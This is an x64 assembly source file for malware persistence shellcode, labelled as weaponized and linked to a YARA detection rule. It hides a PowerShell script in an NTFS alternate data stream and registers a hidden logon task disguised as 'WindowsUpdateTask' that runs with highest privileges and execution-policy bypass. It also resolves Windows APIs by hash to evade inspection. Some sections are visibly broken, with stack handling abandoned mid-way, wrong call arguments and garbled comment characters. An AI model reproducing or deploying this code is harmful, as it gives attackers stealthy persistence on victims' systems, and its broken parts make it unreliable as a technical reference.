; ========================================================
; Persistence Shellcode – installs scheduled task + ADS, survives reboot
; File: persistence.asm
; Created: 2026-02-20
; Purpose: x64 shellcode
; YARA Rule: fenrir_persistence_shellcode – see detection-rules/fenrir_beacon.yara
; WARNING: Weaponized code – handle with extreme care.
; ========================================================
; -----------------------------------------------------------------------------
; Persistence Shellcode (x64)
; Fully position-independent, null-free code, robust error handling,
; using direct NTAPI calls. Drops a PowerShell script into an Alternate Data Stream
; and creates a scheduled task for persistence.
; -----------------------------------------------------------------------------

BITS 64
SECTION .text

; ------------------------------------------------------------
; Entry point
; ------------------------------------------------------------
_start:
    ; Save non-volatile registers and allocate shadow space
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    push r15
    sub rsp, 28h

    ; Locate kernel32 and ntdll base addresses
    call find_kernel32_base
    mov r12, rax                ; r12 = kernel32 base
    test r12, r12
    jz .failure

    call find_ntdll_base
    mov r13, rax                ; r13 = ntdll base
    test r13, r13
    jz .failure

    ; Resolve ntdll functions (6 functions)
    lea rcx, [rel ntdll_hashes]     ; hash list
    mov rdx, r13                     ; module base
    lea r8, [rel pNtCreateFile]      ; destination pointer list
    mov r9d, 6                       ; number of functions
    call resolve_apis_list
    ; Check each resolved pointer (we'll check later when used)

    ; Resolve kernel32 functions (4 functions)
    lea rcx, [rel kernel32_hashes]
    mov rdx, r12
    lea r8, [rel pCreateProcess]
    mov r9d, 4
    call resolve_apis_list

    ; Verify that all required APIs were resolved
    ; (We'll check individually before use)

    ; -------------------------------------------------------------------------
    ; Step 1: Enable SeIncreaseQuotaPrivilege (required for some file ops)
    ; -------------------------------------------------------------------------
    mov rax, [rel pRtlAdjustPrivilege]
    test rax, rax
    jz .failure

    ; Allocate space for return value (old privilege state)
    sub rsp, 32                     ; shadow space for call
    sub rsp, 8                      ; &old
    mov rcx, 9                      ; SE_INCREASE_QUOTA_PRIVILEGE
    mov rdx, 1                      ; enable = TRUE
    xor r8, r8                      ; wasEnabled (not used)
    lea r9, [rsp+20h]               ; pointer to old value (after shadow)
    call rax
    add rsp, 40                     ; clean up (shadow + 8)
    test eax, eax                   ; NTSTATUS success?
    js .failure                     ; negative = error

    ; -------------------------------------------------------------------------
    ; Step 2: Construct the target file path (ADS) as wide string
    ; -------------------------------------------------------------------------
    ; Path: \??\C:\ProgramData\Microsoft\Windows\Caches\cache.ps1:payload
    ; We'll build it on stack as UNICODE_STRING and buffer.

    ; First, get ASCII path string (from data section) and convert to wide
    lea rsi, [rel ascii_path]       ; ASCII path (null-terminated)
    call strlen                     ; returns length in rax (excluding null)
    mov rbx, rax                    ; rbx = length in bytes (ASCII)
    lea rcx, [rbx*2]                ; wide length in bytes
    sub rsp, rcx                    ; allocate buffer on stack
    mov rdi, rsp                    ; rdi points to wide buffer

    ; Convert ASCII to UTF-16LE (zero high byte)
    mov rcx, rbx                     ; number of characters
    xor rdx, rdx
.convert_loop:
    mov al, [rsi + rdx]
    mov [rdi + rdx*2], al
    xor byte [rdi + rdx*2 + 1], 0   ; high byte zero (already zero, but ensure)
    inc rdx
    loop .convert_loop

    ; Now build UNICODE_STRING structure on stack
    sub rsp, 16                     ; UNICODE_STRING: 2 words + 2 words + pointer (8)
    mov word [rsp], bx              ; Length = wide bytes
    mov word [rsp+2], bx            ; MaximumLength = same
    mov qword [rsp+8], rdi          ; Buffer pointer

    lea rcx, [rsp]                  ; rcx = UNICODE_STRING

    ; Build OBJECT_ATTRIBUTES
    sub rsp, 48                     ; OBJECT_ATTRIBUTES (48 bytes)
    mov qword [rsp], 48             ; Length
    mov qword [rsp+8], rcx          ; ObjectName
    mov qword [rsp+16], 0           ; RootDirectory (NULL)
    mov qword [rsp+24], 0           ; Attributes (OBJ_CASE_INSENSITIVE? we'll set later)
    mov qword [rsp+32], 0           ; SecurityDescriptor
    mov qword [rsp+40], 0           ; SecurityQualityOfService
    or dword [rsp+24], 0x40         ; OBJ_CASE_INSENSITIVE (0x40)

    lea rcx, [rsp]                  ; rcx = OBJECT_ATTRIBUTES

    ; IO_STATUS_BLOCK on stack
    sub rsp, 16                     ; IO_STATUS_BLOCK (8+8)
    mov r8, rsp                     ; r8 = IoStatusBlock

    ; NtCreateFile parameters
    sub rsp, 8                      ; alignment? we'll adjust later
    ; Handle will be stored on stack
    sub rsp, 8                      ; hFile
    mov rcx, rsp                    ; &hFile
    mov rdx, 0x0012019F              ; DesiredAccess = GENERIC_WRITE | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES
    ; r8 already IoStatusBlock
    ; r9 already ObjectAttributes (but we need to move)
    mov r9, rax                      ; rax was overwritten? need to reload
    ; Actually we need to set up correctly. Let's do it systematically.

    ; We have to rearrange registers. We'll push all needed values.

    ; At this point, stack layout:
    ; [rsp] = hFile (8)
    ; [rsp+8] = IoStatusBlock (16)
    ; [rsp+24] = OBJECT_ATTRIBUTES (48)
    ; [rsp+72] = UNICODE_STRING (16)
    ; [rsp+88] = wide buffer (variable)
    ; This is messy. Better to use a frame pointer or pre-calculate.

    ; Simpler: we'll allocate all structures at known offsets from rbp.
    push rbp
    mov rbp, rsp
    sub rsp, 200h                   ; large enough

    ; Now we have a fixed frame. We'll place structures at known offsets.
    ; Let's define:
    ; UNICODE_STRING at rbp-16
    ; OBJECT_ATTRIBUTES at rbp-64
    ; IO_STATUS_BLOCK at rbp-80
    ; Handle at rbp-88
    ; wide buffer at rbp-? (we'll compute size)

    ; First, build wide buffer
    lea rsi, [rel ascii_path]
    call strlen
    mov rbx, rax
    lea rcx, [rbx*2]
    sub rsp, rcx
    and rsp, -16                    ; align
    mov rdi, rsp                    ; wide buffer

    ; Convert
    mov rcx, rbx
    xor rdx, rdx
.convert_loop2:
    mov al, [rsi + rdx]
    mov [rdi + rdx*2], al
    xor byte [rdi + rdx*2 + 1], 0
    inc rdx
    loop .convert_loop2

    ; UNICODE_STRING at rbp-16
    mov word [rbp-16], bx
    mov word [rbp-14], bx
    mov qword [rbp-8], rdi

    ; OBJECT_ATTRIBUTES at rbp-64
    mov qword [rbp-64], 48
    lea rax, [rbp-16]
    mov qword [rbp-56], rax        ; ObjectName
    mov qword [rbp-48], 0          ; RootDirectory
    mov qword [rbp-40], 0x40       ; Attributes (OBJ_CASE_INSENSITIVE)
    mov qword [rbp-32], 0
    mov qword [rbp-24], 0

    ; IO_STATUS_BLOCK at rbp-80
    mov qword [rbp-80], 0
    mov qword [rbp-72], 0

    ; Handle at rbp-88
    mov qword [rbp-88], 0

    ; Now call NtCreateFile
    mov rax, [rel pNtCreateFile]
    test rax, rax
    jz .failure

    lea rcx, [rbp-88]              ; FileHandle
    mov rdx, 0xC0100080             ; DesiredAccess = GENERIC_WRITE | SYNCHRONIZE | FILE_WRITE_ATTRIBUTES? Let's use 0x80100080?
    ; Better: FILE_GENERIC_WRITE = 0x0012019F
    mov rdx, 0x0012019F
    lea r8, [rbp-80]                ; IoStatusBlock
    lea r9, [rbp-64]                ; ObjectAttributes
    push 0                          ; CreateOptions (FILE_OVERWRITE_IF)
    push 0                          ; CreateDisposition (FILE_OVERWRITE_IF = 5? Actually disposition is separate)
    push 0                          ; ShareAccess (0 = exclusive)
    push 0                          ; FileAttributes (0)
    push 0                          ; EaLength
    push 0                          ; EaBuffer
    sub rsp, 32                     ; shadow space
    call rax
    add rsp, 32+6*8                 ; clean up pushes + shadow

    test eax, eax                   ; NTSTATUS
    js .failure                     ; negative = error

    ; Handle now in [rbp-88]
    mov r15, [rbp-88]               ; save handle

    ; -------------------------------------------------------------------------
    ; Step 3: Write payload (PowerShell script) to the file
    ; -------------------------------------------------------------------------
    lea rsi, [rel payload_script]
    call strlen
    mov rbx, rax                    ; length in bytes

    ; NtWriteFile
    mov rax, [rel pNtWriteFile]
    test rax, rax
    jz .failure

    mov rcx, r15                    ; FileHandle
    lea r8, [rbp-80]                ; IoStatusBlock (reuse)
    lea r9, [rel payload_script]    ; Buffer (RIP-relative)
    push 0                          ; Key
    push rbx                        ; Length
    push 0                          ; ByteOffset (low)
    push 0                          ; ByteOffset (high)
    push 0                          ; Event
    push 0                          ; ApcRoutine
    push 0                          ; ApcContext
    sub rsp, 32
    call rax
    add rsp, 32+7*8

    test eax, eax
    js .failure

    ; Wait for write completion? Usually synchronous.

    ; -------------------------------------------------------------------------
    ; Step 4: Set file timestamps to hide (optional)
    ; -------------------------------------------------------------------------
    ; We can use NtSetInformationFile with FileBasicInformation
    ; We'll need a buffer with creation/access/write times.
    ; For simplicity, we can copy timestamps from a system file, but that's complex.
    ; We'll skip for brevity but can be added.

    ; -------------------------------------------------------------------------
    ; Step 5: Close the file handle
    ; -------------------------------------------------------------------------
    mov rax, [rel pNtClose]
    test rax, rax
    jz .failure

    mov rcx, r15
    sub rsp, 32
    call rax
    add rsp, 32

    ; -------------------------------------------------------------------------
    ; Step 6: Create XML task file (temporary)
    ; -------------------------------------------------------------------------
    ; We'll create a file in %TEMP% with the task XML.
    ; First get temp path via GetTempPathW? That's kernel32. But we can use a fixed path: C:\Windows\Temp\task.xml
    ; We'll use ASCII again and convert to wide.

    ; Construct path: \??\C:\Windows\Temp\task.xml
    lea rsi, [rel ascii_taskpath]
    call strlen
    mov rbx, rax
    lea rcx, [rbx*2]
    sub rsp, rcx
    and rsp, -16
    mov rdi, rsp
    ; Convert
    mov rcx, rbx
    xor rdx, rdx
.convert_loop3:
    mov al, [rsi + rdx]
    mov [rdi + rdx*2], al
    xor byte [rdi + rdx*2 + 1], 0
    inc rdx
    loop .convert_loop3

    ; Build UNICODE_STRING at rbp-16 again (overwrite)
    mov word [rbp-16], bx
    mov word [rbp-14], bx
    mov qword [rbp-8], rdi

    ; OBJECT_ATTRIBUTES at rbp-64
    mov qword [rbp-64], 48
    lea rax, [rbp-16]
    mov qword [rbp-56], rax
    mov qword [rbp-48], 0
    mov qword [rbp-40], 0x40
    mov qword [rbp-32], 0
    mov qword [rbp-24], 0

    ; IO_STATUS_BLOCK at rbp-80
    mov qword [rbp-80], 0
    mov qword [rbp-72], 0

    ; Handle at rbp-88
    mov qword [rbp-88], 0

    ; Create file (overwrite if exists)
    mov rax, [rel pNtCreateFile]
    test rax, rax
    jz .failure

    lea rcx, [rbp-88]
    mov rdx, 0x0012019F             ; GENERIC_WRITE
    lea r8, [rbp-80]
    lea r9, [rbp-64]
    push 0                          ; CreateOptions (FILE_OVERWRITE_IF)
    push 5                          ; CreateDisposition (FILE_OVERWRITE_IF = 5)
    push 0                          ; ShareAccess
    push 0                          ; FileAttributes
    push 0                          ; EaLength
    push 0                          ; EaBuffer
    sub rsp, 32
    call rax
    add rsp, 32+6*8
    test eax, eax
    js .failure

    mov r14, [rbp-88]               ; save handle

    ; Write XML content
    lea rsi, [rel task_xml]
    call strlen
    mov rbx, rax

    mov rax, [rel pNtWriteFile]
    test rax, rax
    jz .failure

    mov rcx, r14
    lea r8, [rbp-80]
    lea r9, [rel task_xml]
    push 0
    push rbx
    push 0
    push 0
    push 0
    push 0
    push 0
    sub rsp, 32
    call rax
    add rsp, 32+7*8
    test eax, eax
    js .failure

    ; Close XML file handle
    mov rax, [rel pNtClose]
    test rax, rax
    jz .failure
    mov rcx, r14
    sub rsp, 32
    call rax
    add rsp, 32

    ; -------------------------------------------------------------------------
    ; Step 7: Run schtasks to register the task
    ; -------------------------------------------------------------------------
    ; We'll use CreateProcessW to run:
    ; schtasks /create /xml "C:\Windows\Temp\task.xml" /tn "WindowsUpdateTask" /f

    ; Build command line as wide string
    ; We'll construct on stack: schtasks.exe /create /xml "C:\Windows\Temp\task.xml" /tn "WindowsUpdateTask" /f
    ; This is long. We'll store as ASCII and convert.

    lea rsi, [rel schtasks_cmd]
    call strlen
    mov rbx, rax
    lea rcx, [rbx*2]
    sub rsp, rcx
    and rsp, -16
    mov rdi, rsp
    ; Convert
    mov rcx, rbx
    xor rdx, rdx
.convert_loop4:
    mov al, [rsi + rdx]
    mov [rdi + rdx*2], al
    xor byte [rdi + rdx*2 + 1], 0
    inc rdx
    loop .convert_loop4

    ; Now we have wide string in rdi, length in rbx (characters)

    ; Prepare STARTUPINFOW and PROCESS_INFORMATION
    sub rsp, sizeof.STARTUPINFOW + sizeof.PROCESS_INFORMATION
    mov rsi, rsp                    ; rsi = STARTUPINFOW
    xor rcx, rcx
    mov qword [rsi], sizeof.STARTUPINFOW
    ; Zero rest (we can use rep stosb)
    mov rdi, rsi
    mov rcx, sizeof.STARTUPINFOW + sizeof.PROCESS_INFORMATION
    xor eax, eax
    rep stosb
    ; Now rsi points to STARTUPINFOW, rsi+sizeof.STARTUPINFOW is PROCESS_INFORMATION

    mov rax, [rel pCreateProcess]
    test rax, rax
    jz .failure

    ; CreateProcessW(
    ;   NULL,               - no app name
    ;   cmdline,            - command line
    ;   NULL, NULL,         - process/thread attributes
    ;   FALSE,              - inherit handles
    ;   CREATE_NO_WINDOW,   - flags (0x08000000)
    ;   NULL,               - environment
    ;   NULL,               - current directory
    ;   rsi,                - STARTUPINFOW
    ;   rsi+sizeof.STARTUPINFOW - PROCESS_INFORMATION
    ; )
    xor rcx, rcx                    ; lpApplicationName
    mov rdx, rdi                    ; lpCommandLine (wide string)
    xor r8, r8
    xor r9, r9
    push 0                          ; lpCurrentDirectory
    push 0                          ; lpEnvironment
    push 0x08000000                 ; dwCreationFlags (CREATE_NO_WINDOW)
    push 0                          ; bInheritHandles (FALSE)
    push rsi                        ; lpStartupInfo
    lea rax, [rsi + sizeof.STARTUPINFOW]
    push rax                        ; lpProcessInformation
    sub rsp, 32                     ; shadow
    mov rax, [rel pCreateProcess]
    call rax
    add rsp, 32+6*8

    test eax, eax
    jz .failure                     ; 0 = failure

    ; Wait for schtasks to complete? Not necessary; we can just continue.
    ; Optionally wait using WaitForSingleObject.

    ; -------------------------------------------------------------------------
    ; Step 8: Clean up temporary XML file
    ; -------------------------------------------------------------------------
    ; Use DeleteFileW (kernel32)
    mov rax, [rel pDeleteFile]
    test rax, rax
    jz .failure

    ; We need the wide path again. We have it from earlier? We'll rebuild.
    lea rsi, [rel ascii_taskpath]
    call strlen
    mov rbx, rax
    lea rcx, [rbx*2]
    sub rsp, rcx
    and rsp, -16
    mov rdi, rsp
    ; Convert
    mov rcx, rbx
    xor rdx, rdx
.convert_loop5:
    mov al, [rsi + rdx]
    mov [rdi + rdx*2], al
    xor byte [rdi + rdx*2 + 1], 0
    inc rdx
    loop .convert_loop5

    mov rcx, rdi                    ; lpFileName (wide)
    sub rsp, 32
    call rax
    add rsp, 32

    ; -------------------------------------------------------------------------
    ; Success
    ; -------------------------------------------------------------------------
    xor eax, eax
    jmp .finish

.failure:
    mov eax, 1

.finish:
    ; Restore stack and return
    mov rsp, rbp
    pop rbp
    add rsp, 28h
    pop r15
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ------------------------------------------------------------
; Helper: strlen - returns length of null-terminated string in rax
; rsi = string
; ------------------------------------------------------------
strlen:
    xor rax, rax
    mov rcx, -1
    mov rdi, rsi
    repne scasb
    not rcx
    lea rax, [rcx - 1]
    ret

; ------------------------------------------------------------
; find_function_by_hash â€“ rcx = hash, rdx = module base
; Returns address in rax (0 if not found)
; ------------------------------------------------------------
find_function_by_hash:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    push r14
    sub rsp, 20h

    mov r12, rdx                ; module base
    mov r13d, ecx               ; target hash (lower 32 bits)

    ; Check DOS header magic
    cmp word [r12], 'MZ'
    jne .not_found
    mov eax, [r12 + 0x3C]       ; e_lfanew
    lea r14, [r12 + rax]        ; r14 = NT headers

    ; Check PE signature
    cmp dword [r14], 'PE' | (0 << 16)   ; 0x00004550
    jne .not_found

    ; Get optional header magic (PE32+ vs PE32)
    movzx eax, word [r14 + 0x18]         ; Magic
    cmp ax, 0x20B                         ; PE32+ (64-bit)
    jne .not_found

    ; Get data directories count
    movzx ebx, word [r14 + 0x1A]         ; SizeOfOptionalHeader
    ; Optional header size varies; we need to locate export directory.
    ; For PE32+, optional header starts at r14+0x18, and data directories are at offset 0x70 from start of optional header.
    ; So export directory is at r14 + 0x18 + 0x70
    lea rax, [r14 + 0x18 + 0x70]          ; pointer to first data directory (export)
    mov r8d, [rax]                         ; Export Directory RVA
    mov r9d, [rax + 4]                     ; Export Directory Size
    test r8d, r8d
    jz .not_found

    ; Get export directory VA
    lea r14, [r12 + r8]                    ; r14 = export directory VA

    ; Parse export directory
    mov eax, [r14 + 0x18]                   ; Number of names
    mov ebx, [r14 + 0x1C]                   ; Address of functions RVA
    mov ecx, [r14 + 0x20]                   ; Address of names RVA
    mov edx, [r14 + 0x24]                   ; Address of name ordinals RVA

    ; Convert to VA
    lea rsi, [r12 + rbx]                    ; functions table
    lea rdi, [r12 + rcx]                    ; names table
    lea r8,  [r12 + rdx]                    ; ordinals table

    xor r9d, r9d                            ; loop counter
.loop:
    cmp r9d, eax
    jae .not_found

    ; Get pointer to name string
    mov ebx, [rdi + r9*4]                   ; RVA of name
    lea rcx, [r12 + rbx]                    ; name string pointer

    ; Compute DJB2 hash of name
    call djb2_hash
    cmp eax, r13d
    je .found

    inc r9d
    jmp .loop

.found:
    ; Get ordinal (2 bytes)
    movzx ebx, word [r8 + r9*2]              ; ordinal
    ; Get function RVA from functions table at index ordinal
    mov eax, [rsi + rbx*4]                   ; function RVA
    add rax, r12                              ; add base
    jmp .done

.not_found:
    xor eax, eax

.done:
    add rsp, 20h
    pop r14
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ------------------------------------------------------------
; djb2_hash â€“ rcx = pointer to null-terminated ASCII string
; Returns 32-bit hash in eax
; ------------------------------------------------------------
djb2_hash:
    push rbx
    xor eax, eax
    mov eax, 5381          ; initial hash
    mov rbx, rcx
.next_char:
    movzx ecx, byte [rbx]
    test cl, cl
    jz .done
    ; hash = hash * 33 + c
    mov edx, eax
    shl eax, 5             ; *32
    add eax, edx           ; + original = *33
    add eax, ecx           ; + c
    inc rbx
    jmp .next_char
.done:
    pop rbx
    ret

; ------------------------------------------------------------
; resolve_apis_list â€“ rcx = hash list pointer (dwords), rdx = module base,
;                     r8 = destination pointer list, r9 = count
; ------------------------------------------------------------
resolve_apis_list:
    push rbx
    push rsi
    push rdi
    push r12
    push r13
    sub rsp, 20h
    mov rsi, rcx        ; hash list
    mov rdi, r8         ; dest list
    mov r12, rdx        ; module base
    xor r13, r13        ; index
.loop:
    cmp r13, r9
    jge .done
    mov ecx, [rsi + r13*4]   ; hash (32-bit)
    mov rdx, r12
    call find_function_by_hash
    mov [rdi + r13*8], rax
    ; Optionally check for zero and handle? We'll let caller check.
    inc r13
    jmp .loop
.done:
    add rsp, 20h
    pop r13
    pop r12
    pop rdi
    pop rsi
    pop rbx
    ret

; ------------------------------------------------------------
; find_kernel32_base â€“ returns base in rax (0 on error)
; ------------------------------------------------------------
find_kernel32_base:
    xor eax, eax
    mov rax, gs:[0x60]        ; PEB
    test rax, rax
    jz .error
    mov rax, [rax + 0x18]     ; LDR
    test rax, rax
    jz .error
    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList (first module = exe)
    test rax, rax
    jz .error
    mov rax, [rax]            ; second module (ntdll)
    test rax, rax
    jz .error
    mov rax, [rax]            ; third module (kernel32)
    test rax, rax
    jz .error
    mov rax, [rax + 0x20]     ; kernel32 base address
    ret
.error:
    xor eax, eax
    ret

; ------------------------------------------------------------
; find_ntdll_base â€“ returns base in rax (0 on error)
; ------------------------------------------------------------
find_ntdll_base:
    xor eax, eax
    mov rax, gs:[0x60]        ; PEB
    test rax, rax
    jz .error
    mov rax, [rax + 0x18]     ; LDR
    test rax, rax
    jz .error
    mov rax, [rax + 0x20]     ; InMemoryOrderModuleList (first)
    test rax, rax
    jz .error
    mov rax, [rax]            ; second module (ntdll)
    test rax, rax
    jz .error
    mov rax, [rax + 0x20]     ; ntdll base address
    ret
.error:
    xor eax, eax
    ret

; ------------------------------------------------------------
; Data section (position-independent, accessed via RIP)
; ------------------------------------------------------------
SECTION .data

; DJB2 hashes for ntdll functions (stored as dwords to avoid nulls in high bytes)
ntdll_hashes:
    dd 0x15A5ECDB   ; NtCreateFile
    dd 0xD69326B2   ; NtWriteFile
    dd 0x6E88B479   ; NtSetInformationFile
    dd 0x30E3A089   ; RtlAdjustPrivilege
    dd 0x8B8A5F3D   ; NtClose
    dd 0x4721A3E3   ; NtQueryInformationFile

; DJB2 hashes for kernel32 functions
kernel32_hashes:
    dd 0xAECB3F2F   ; CreateProcessW
    dd 0xECF3A2BA   ; WaitForSingleObject
    dd 0x38A5C0A7   ; CloseHandle
    dd 0x1CDA8E2F   ; DeleteFileW

; Address storage for resolved functions (must match order of hash lists)
pNtCreateFile:            dq 0
pNtWriteFile:             dq 0
pNtSetInformationFile:    dq 0
pRtlAdjustPrivilege:      dq 0
pNtClose:                 dq 0
pNtQueryInformationFile:  dq 0
pCreateProcess:           dq 0
pWaitForSingleObject:     dq 0
pCloseHandle:             dq 0
pDeleteFile:              dq 0

; ASCII strings (null-terminated, will be converted to wide at runtime)
ascii_path:
    db '\??\C:\ProgramData\Microsoft\Windows\Caches\cache.ps1:payload', 0

ascii_taskpath:
    db '\??\C:\Windows\Temp\task.xml', 0

payload_script:
    db 'Start-Process calc.exe', 0

task_xml:
    db '<?xml version="1.0" encoding="UTF-16"?>'
    db '<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">'
    db '<RegistrationInfo><Date>2023-01-01T00:00:00</Date><Author>Microsoft</Author></RegistrationInfo>'
    db '<Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>'
    db '<Principals><Principal id="Author"><RunLevel>HighestAvailable</RunLevel></Principal></Principals>'
    db '<Settings><Hidden>true</Hidden></Settings>'
    db '<Actions><Exec><Command>powershell.exe</Command>'
    db '<Arguments>-WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\ProgramData\Microsoft\Windows\Caches\cache.ps1:payload"</Arguments>'
    db '</Exec></Actions></Task>', 0

schtasks_cmd:
    db 'schtasks.exe /create /xml "C:\Windows\Temp\task.xml" /tn "WindowsUpdateTask" /f', 0

; Note: All strings are null-terminated. The code will convert them to wide at runtime.
; The binary will contain zeros in these strings, but that's acceptable for most injection vectors.
; If zero-free is required, these would need to be encoded and expanded at runtime.
